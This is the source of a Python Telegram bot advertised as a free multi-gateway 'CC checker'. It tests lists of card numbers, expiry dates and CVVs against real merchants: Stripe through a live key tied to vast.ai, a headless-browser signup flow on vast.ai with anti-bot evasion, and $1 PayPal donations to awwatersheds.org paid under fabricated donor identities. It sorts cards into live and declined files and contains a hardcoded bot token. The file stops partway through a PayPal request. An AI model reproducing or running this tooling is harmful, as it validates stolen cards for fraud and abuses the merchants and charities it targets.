#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Free Multi Gateway CC Checker Bot
Version: 24.0 - Complete Multi Gateway (Stripe + Real Check + PayPal)
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import os
import threading
import asyncio
import base64
import uuid
import warnings
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
import http.server
import socketserver
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import io

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style
    import telebot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    from playwright.async_api import async_playwright
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    sys.exit(1)

# تجاهل التحذيرات
warnings.filterwarnings("ignore")

# تهيئة الألوان
init(autoreset=True)

# Fix encoding for Windows terminal
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# مجلدات التخزين
DATA_FOLDER = "data"
BACKUP_FOLDER = "backups"
TEMP_FOLDER = "temp"

os.makedirs(DATA_FOLDER, exist_ok=True)
os.makedirs(BACKUP_FOLDER, exist_ok=True)
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ملفات التخزين
USERS_FILE = os.path.join(DATA_FOLDER, "users.json")
APPROVED_CARDS_FILE = os.path.join(DATA_FOLDER, "approved.txt")
DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")
SUCCESS_FILE = os.path.join(DATA_FOLDER, "sucess.txt")
SUFFICIENT_FUNDS_FILE = os.path.join(DATA_FOLDER, "sufficient_funds.txt")
ERROR_FILE = os.path.join(DATA_FOLDER, "erro.txt")

# ==================== إعدادات البوابات ====================
GATES = {
    "stripe": {
        "name": "💳 Stripe Gateway",
        "command": "st",
        "mass_command": "mass",
        "icon": "💳",
        "default": True
    },
    "real": {
        "name": "✅ Real Check",
        "command": "chk",
        "mass_command": "chkm",
        "icon": "✅",
        "default": False
    },
    "paypal": {
        "name": "💰 PayPal Gateway",
        "command": "pp",
        "mass_command": "ppm",
        "icon": "💰",
        "default": False
    }
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
user_last_file = {}
user_active_checks = {}
active_checks_lock = threading.Lock()
file_lock = threading.Lock()

# ==================== إدارة البيانات ====================
class DataManager:
    
    @staticmethod
    def init_files():
        if not os.path.exists(USERS_FILE):
            users = {}
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                    "default_gate": "stripe"
                }
            DataManager.save_json(USERS_FILE, users)
        
        if not os.path.exists(STATS_FILE):
            DataManager.save_json(STATS_FILE, {
                "total_checks": 0,
                "total_approved": 0,
                "total_declined": 0,
                "gates_usage": {},
                "daily_stats": {},
                "last_backup": None
            })
        
        if not os.path.exists(SETTINGS_FILE):
            DataManager.save_json(SETTINGS_FILE, {
                "auto_backup": True,
                "auto_clean": True,
                "clean_days": 30,
                "maintenance_mode": False,
                "default_check_gate": "stripe",
                "delay_between_cards": 3
            })
        
        if not os.path.exists(GROUPS_FILE):
            DataManager.save_json(GROUPS_FILE, {
                "allowed_groups": [],
                "blocked_groups": [],
                "group_settings": {}
            })
        
        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE, SUCCESS_FILE, SUFFICIENT_FUNDS_FILE, ERROR_FILE]:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write(f"# {'Approved' if 'approved' in file else 'Declined' if 'declined' in file else 'Success'} Cards\n")
    
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"❌ خطأ: {e}")
            return False
    
    @staticmethod
    def load_users() -> Dict:
        DataManager.init_files()
        users = DataManager.load_json(USERS_FILE, {})
        for uid, user in users.items():
            if "usage" not in user:
                user["usage"] = {"total_checks": 0, "approved": 0, "declined": 0}
            if "default_gate" not in user:
                user["default_gate"] = "stripe"
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        stats = DataManager.load_json(STATS_FILE, {})
        defaults = {
            "total_checks": 0, "total_approved": 0, "total_declined": 0,
            "gates_usage": {}, "daily_stats": {}, "last_backup": None
        }
        for key, value in defaults.items():
            if key not in stats:
                stats[key] = value
        return stats
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def load_settings() -> Dict:
        settings = DataManager.load_json(SETTINGS_FILE, {
            "auto_backup": True, "auto_clean": True, "clean_days": 30,
            "maintenance_mode": False, "default_check_gate": "stripe", "delay_between_cards": 3
        })
        return settings
    
    @staticmethod
    def save_settings(settings: Dict) -> bool:
        return DataManager.save_json(SETTINGS_FILE, settings)
    
    @staticmethod
    def save_card_result(card: str, gate: str, response: str, user_id: int, is_approved: bool):
        try:
            file_path = APPROVED_CARDS_FILE if is_approved else DECLINED_CARDS_FILE
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def save_paypal_result(cc_str: str, status: str, msg: str):
        fmap = {"CHARGED": SUCCESS_FILE, "APPROVED": SUCCESS_FILE, "LIVE": SUFFICIENT_FUNDS_FILE, "DECLINED": DECLINED_CARDS_FILE}
        fn = fmap.get(status, ERROR_FILE)
        with file_lock:
            with open(fn, "a", encoding="utf-8") as f:
                f.write(f"{cc_str} -> {status}: {msg}\n")
    
    @staticmethod
    def check_access(user_id: int, chat_id: int = None) -> bool:
        if user_id in ADMIN_IDS:
            return True
        settings = DataManager.load_settings()
        if settings.get("maintenance_mode", False):
            return False
        return True
    
    @staticmethod
    def get_user_default_gate(user_id: int) -> str:
        users = DataManager.load_users()
        return users.get(str(user_id), {}).get("default_gate", "stripe")
    
    @staticmethod
    def set_user_default_gate(user_id: int, gate: str) -> bool:
        if gate not in GATES:
            return False
        users = DataManager.load_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
        users[uid]["default_gate"] = gate
        return DataManager.save_users(users)
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
        
        is_approved = "✅" in result or "مقبولة" in result or "APPROVED" in result or "CHARGED" in result
        usage = users[uid]["usage"]
        usage["total_checks"] += 1
        
        if is_approved:
            usage["approved"] += 1
            stats["total_approved"] = stats.get("total_approved", 0) + 1
        else:
            usage["declined"] += 1
            stats["total_declined"] = stats.get("total_declined", 0) + 1
        
        stats["total_checks"] = stats.get("total_checks", 0) + 1
        stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
        
        today = datetime.now().strftime("%Y-%m-%d")
        if today not in stats["daily_stats"]:
            stats["daily_stats"][today] = {"checks": 0, "approved": 0}
        stats["daily_stats"][today]["checks"] += 1
        if is_approved:
            stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(year) == 4:
                        year = year[-2:]
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1:
                            month = f"0{month}"
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {
                                'number': number, 'month': month, 'year': year, 'cvv': cvv,
                                'original': card_str, 'name': parts[4] if len(parts) > 4 else "Card Holder"
                            }
            return None
        except:
            return None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[Dict]:
        cards = []
        for line in text.strip().split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                card = Helpers.parse_card(line)
                if card:
                    cards.append(card)
        return cards
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            card_number = re.sub(r'[\s-]', '', card_number)
            if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
                return False
            digits = [int(d) for d in card_number]
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9:
                        digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
    
    @staticmethod
    def get_chat_type(chat_id: int) -> str:
        return "private" if chat_id > 0 else "group"
    
    @staticmethod
    def generate_random_email() -> str:
        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
        number = random.randint(100, 9999)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
        return f"{username}{number}@{random.choice(domains)}"
    
    @staticmethod
    def normalize_url(url: str) -> str:
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        url = url.rstrip('/')
        if '/my-account' not in url.lower():
            url += '/my-account'
        if not url.endswith('/'):
            url += '/'
        return url
    
    @staticmethod
    def generate_guid() -> str:
        return str(uuid.uuid4())

# ==================== تنسيق النتائج ====================
class ResultFormatter:
    @staticmethod
    def format_single_result(card: str, result: str, is_approved: bool, gate_name: str, bin_info: Dict = None) -> str:
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        status = "✅ LIVE - CARD APPROVED" if is_approved else "❌ DECLINED"
        
        bin_text = f"\n𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}\n𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}\n𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}\n𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}" if bin_info else ""
        
        return f"""
🚀 {gate_name} 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status}
{bin_text}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
🆔 Obeida Online | @ObeidaTrading
"""

# ==================== بوابة Stripe (SetupIntent Auth) ====================
class StripeGateway:
    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            timeout = aiohttp.ClientTimeout(total=70)
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                ua_obj = UserAgent()
                random_ua = ua_obj.random
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                domain = "https://cloud.vast.ai"
                
                stripe_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': random_ua
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvv'],
                    'card[exp_month]': card_data['month'],
                    'card[exp_year]': card_data['year'],
                    'allow_redisplay': 'unspecified',
                    'billing_details[address][country]': 'US',
                    'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                    'referrer': domain,
                    'client_attribution_metadata[client_session_id]': Helpers.generate_guid(),
                    'client_attribution_metadata[merchant_integration_source]': 'elements',
                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                    'client_attribution_metadata[merchant_integration_version]': '2021',
                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                    'client_attribution_metadata[elements_session_config_id]': Helpers.generate_guid(),
                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                    'guid': Helpers.generate_guid(),
                    'muid': Helpers.generate_guid(),
                    'sid': Helpers.generate_guid(),
                    'key': stripe_key,
                    '_stripe_version': '2024-06-20'
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                if 'error' in pm_json:
                    err = pm_json['error']
                    code = err.get('decline_code', '')
                    message = err.get('message', '')
                    if code in ['incorrect_cvc', 'invalid_cvc']:
                        return True, "💳 CVV ERROR - Card is LIVE"
                    elif code == 'insufficient_funds':
                        return True, "💰 INSUFFICIENT FUNDS - Card is LIVE"
                    elif 'expired' in message.lower():
                        return False, "❌ EXPIRED CARD"
                    return False, f"❌ DECLINED: {message[:50]}"
                
                return True, "✅ APPROVED"
        except Exception as e:
            return False, f"⚠️ خطأ: {str(e)[:50]}"

# ==================== بوابة Real Check ====================
class RealCheckGateway:
    
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ]
        self.viewports = [
            {'width': 891, 'height': 1711},
            {'width': 393, 'height': 852},
            {'width': 390, 'height': 844},
        ]
    
    def generate_random_email(self) -> str:
        return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com"
    
    async def type_like_human(self, page, selector: str, text: str):
        await page.locator(selector).click()
        await asyncio.sleep(random.uniform(0.1, 0.3))
        for char in text:
            await page.locator(selector).type(char, delay=random.uniform(0.08, 0.15))
            await asyncio.sleep(random.uniform(0.02, 0.05))
    
    async def type_card_number(self, page, card_number: str):
        await page.locator("#cardNumber").click()
        await asyncio.sleep(random.uniform(0.2, 0.4))
        for i in range(0, len(card_number), 4):
            group = card_number[i:i+4]
            for char in group:
                await page.locator("#cardNumber").type(char, delay=random.uniform(0.08, 0.15))
            await asyncio.sleep(random.uniform(0.1, 0.25))
    
    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
        random_ua = random.choice(self.user_agents)
        random_viewport = random.choice(self.viewports)
        
        card_result = {"approved": None, "message": None, "card_id": None}
        response_received = threading.Event()
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    viewport=random_viewport,
                    user_agent=random_ua
                )
                
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                    window.chrome = { runtime: {} };
                """)
                
                page = await context.new_page()
                email = self.generate_random_email()
                password = "Obeida059@"
                name = card_data.get('name', 'Card Holder')
                
                async def handle_response(response):
                    try:
                        url = response.url()
                        
                        if 'api/v0/billing/cards/' in url and response.status == 200:
                            try:
                                data = await response.json()
                                if data and isinstance(data, dict):
                                    if data.get('id') or data.get('brand') or data.get('last4'):
                                        card_result["approved"] = True
                                        card_result["message"] = "✅ البطاقة مقبولة"
                                        card_result["card_id"] = data.get('id')
                                        response_received.set()
                                        return
                                elif isinstance(data, list):
                                    if len(data) == 0:
                                        card_result["approved"] = False
                                        card_result["message"] = "❌ البطاقة مرفوضة"
                                        response_received.set()
                                        return
                                    elif len(data) > 0 and isinstance(data[0], dict):
                                        if data[0].get('id') or data[0].get('brand'):
                                            card_result["approved"] = True
                                            card_result["message"] = "✅ البطاقة مقبولة"
                                            response_received.set()
                                            return
                            except:
                                pass
                        
                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url):
                            try:
                                data = await response.json()
                                if data.get('error'):
                                    error = data.get('error')
                                    error_code = error.get('code', '')
                                    error_message = error.get('message', '').lower()
                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
                                        card_result["approved"] = True
                                        card_result["message"] = "✅ البطاقة مقبولة"
                                        response_received.set()
                                        return
                                    elif 'insufficient' in error_message:
                                        card_result["approved"] = True
                                        card_result["message"] = "✅ البطاقة مقبولة"
                                        response_received.set()
                                        return
                            except:
                                pass
                    except:
                        pass
                
                page.on('response', handle_response)
                
                await page.goto("https://cloud.vast.ai/create/", timeout=30000)
                await asyncio.sleep(random.uniform(1.5, 2.5))
                
                await page.locator('[data-testid="vast-main-login-button"]').click()
                await asyncio.sleep(random.uniform(1, 1.5))
                
                await self.type_like_human(page, '#\\:r12\\:', email)
                await asyncio.sleep(random.uniform(0.5, 1))
                await self.type_like_human(page, '#\\:r14\\:', password)
                await asyncio.sleep(random.uniform(0.3, 0.6))
                await self.type_like_human(page, '#\\:r15\\:', password)
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await page.locator('div.MuiDialog-root label:nth-of-type(1) input').click()
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await page.locator('[data-testid="auth-submit-login-signup"]').click()
                await asyncio.sleep(random.uniform(3, 4))
                
                await page.locator('div:nth-of-type(2) > li:nth-of-type(1) span.vast-typography').click()
                await asyncio.sleep(random.uniform(2, 3))
                
                await page.locator('[data-testid="billing-page-payment-methods-add-card-button"]').click()
                await asyncio.sleep(random.uniform(4, 6))
                
                expiry = f"{card_data['month']}/{card_data['year']}"
                
                await self.type_card_number(page, card_data['number'])
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await self.type_like_human(page, "#cardExpiry", expiry)
                await asyncio.sleep(random.uniform(0.2, 0.4))
                
                await self.type_like_human(page, "#cardCvc", card_data['cvv'])
                await asyncio.sleep(random.uniform(0.2, 0.4))
                
                await self.type_like_human(page, "#billingName", name)
                await asyncio.sleep(random.uniform(0.2, 0.4))
                
                await page.locator("#billingCountry").click()
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await self.type_like_human(page, "#billingCountry", "US")
                await asyncio.sleep(random.uniform(0.1, 0.3))
                
                await self.type_like_human(page, "#billingPostalCode", "90003")
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await page.locator('div.SubmitButton-IconContainer').click()
                
                try:
                    await asyncio.wait_for(response_received.wait(), timeout=25)
                except:
                    pass
                
                current_url = page.url
                page_content = await page.content()
                
                await browser.close()
                
                if card_result["approved"] is True:
                    return True, card_result["message"]
                if card_result["approved"] is False:
                    return False, card_result["message"]
                
                combined_text = (current_url + " " + page_content).lower()
                
                if 'billing?session_id=' in current_url:
                    return True, "✅ البطاقة مقبولة"
                if 'payment-methods' in current_url and card_data['number'][-4:] in page_content:
                    return True, "✅ البطاقة مقبولة"
                if 'stripe.com' in current_url:
                    if 'cvv' in combined_text or 'security' in combined_text:
                        return True, "✅ البطاقة مقبولة"
                    if 'insufficient' in combined_text:
                        return True, "✅ البطاقة مقبولة"
                    if 'declined' in combined_text:
                        return False, "❌ البطاقة مرفوضة"
                if 'id' in combined_text and card_data['number'][-4:] in combined_text:
                    return True, "✅ البطاقة مقبولة"
                
                return False, "❌ البطاقة مرفوضة"
                        
        except Exception as e:
            print(f"⚠️ خطأ: {e}")
            return False, "❌ البطاقة مرفوضة"

# ==================== بوابة PayPal ====================
class PayPalGateway:
    
    FIRST_NAMES = [
        "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
        "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
        "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
        "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
        "Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"
    ]
    
    LAST_NAMES = [
        "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
        "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
        "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
        "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
    ]
    
    ADDRESSES = [
        {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
        {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
        {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
        {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
        {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
        {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
        {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
        {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
        {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
        {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
    ]
    
    PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]
    EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
    
    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.verify = True
        self.last_error = ""
        if proxy:
            if proxy.count(':') == 3 and '@' not in proxy:
                p = proxy.split(':')
                fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
                self.session.proxies = {"http": fmt, "https": fmt}
            elif '@' in proxy:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            else:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        self.ajax_headers = {
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://awwatersheds.org",
            "Referer": "https://awwatersheds.org/donate/",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.tokens = {}
    
    def random_donor(self) -> Dict[str, str]:
        first = random.choice(self.FIRST_NAMES)
        last = random.choice(self.LAST_NAMES)
        addr = random.choice(self.ADDRESSES)
        phone = random.choice(self.PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
        domain = random.choice(self.EMAIL_DOMAINS)
        email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
        return {
            "first": first,
            "last": last,
            "email": email,
            "phone": phone,
            "address": addr
        }
    
    def detect_type(self, n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"):
            return "VISA"
        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n):
            return "MASTER_CARD"
        elif n.startswith(("34", "37")):
            return "AMEX"
        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n):
            return "DISCOVER"
        return "VISA"
    
    def scrape_tokens(self) -> bool:
        try:
            r = self.session.get("https://awwatersheds.org/donate/", headers={"User-Agent": self.ua}, timeout=20)
            html = r.text
            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not h:
                h = re.search(r'"base_hash":"(.*?)"', html)
            if not h:
                self.last_error = "Hash not found"
                return False
            self.tokens['hash'] = h.group(1)
            pfx = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            if pfx:
                self.tokens['pfx'] = pfx.group(1)
            fid = re.search(r'name="give-form-id" value="(.*?)"', html)
            if fid:
                self.tokens['id'] = fid.group(1)
            return True
        except Exception as e:
            self.last_error = str(e)
            return False
    
    def register_donation(self, donor: Dict[str, str]) -> bool:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens.get('pfx', ''),
            "give-form-id": self.tokens.get('id', ''),
            "give-form-title": "Sustainers Circle",
            "give-current-url": "https://awwatersheds.org/donate/",
            "give-form-url": "https://awwatersheds.org/donate/",
            "give-form-hash": self.tokens.get('hash', ''),
            "give-price-id": "custom",
            "give-amount": "1.00",
            "payment-mode": "paypal-commerce",
            "give_first": donor["first"],
            "give_last": donor["last"],
            "give_email": donor["email"],
            "give-lake-affiliation": "Other",
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true"
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=self.ajax_headers, data=data, timeout=20)
            return r.status_code == 200
        except:
            return False
    
    def create_order(self) -> Optional[str]:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens.get('pfx', ''),
            "give-form-id": self.tokens.get('id', ''),
            "give-form-hash": self.tokens.get('hash', ''),
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                                  params={"action": "give_paypal_commerce_create_order"},
                                  headers=self.ajax_headers, data=data, timeout=20)
            rj = r.json()
            if rj.get("success") and "data" in rj:
                return rj["data"]["id"]
            return None
        except:
            return None
    
    def charge_card(self, order_id: str, card: Dict[str, str], donor: Dict[str, str]) -> str:
        addr = donor["address"]
        graphql_h = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": self.ua,
            "Content-Type": "application/json",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
            "X-Country": "US"
        }
        
        query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
